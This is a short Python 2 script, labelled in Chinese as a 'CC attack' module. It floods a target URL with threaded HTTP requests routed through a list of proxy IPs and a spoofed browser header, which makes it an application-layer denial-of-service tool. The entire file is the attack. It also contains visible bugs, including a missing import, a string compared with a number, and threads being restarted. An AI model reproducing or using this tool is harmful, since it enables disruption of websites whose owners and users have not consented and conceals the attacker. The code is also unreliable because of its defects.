# -*- coding: utf-8 -*-
"""cc攻击模块"""
import optparse
import threading
import urllib2
from random import choice
"""定义请求头"""
User_Agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'
header = {}
header['User-Agent'] = User_Agent
thread_list = []
def main():
    parser = optparse.OptionParser(u"usage%prog -u '<url 攻击地址>' -t '<启动攻击的线程数>' -f '<可用的代理IP文件>'")
    parser.add_option('-u',dest="URL",type="string",help=u"要攻击的地址")
    parser.add_option('-t',dest='threadnum',type='string',help=u'启动的线程数')
    parser.add_option('-f',dest='filename',type='string',help=u'可用的代理IP文件')
    (options, args) = parser.parse_args()
    if options.URL != None and options.threadnum != None and options.filename != None:
        URL = options.URL
        threadnum = options.threadnum
        filename = options.filename
        f = open(filename,'r')
        lines = f.readlines()
        for ip in lines:
            t = threading.Thread(target=cc,args=(URL,ip))
            thread_list.append(t)
        t = choice(thread_list)
        print t
        while True:
            if len(threading.enumerate()) < threadnum:
                t = choice(thread_list)
                t.start()
            else:
                time.sleep(0.1)

def cc(url,ip):
    req = urllib2.Request(url,headers=header)
    print "使用代理IP%s攻击:%s" % (ip,url)
    proxies={"http":ip}
    proxy_s=urllib2.ProxyHandler(proxies)
    opener=urllib2.build_opener(proxy_s)
    urllib2.install_opener(opener)
    content=urllib2.urlopen(req).read()
if __name__ == '__main__':
    main()
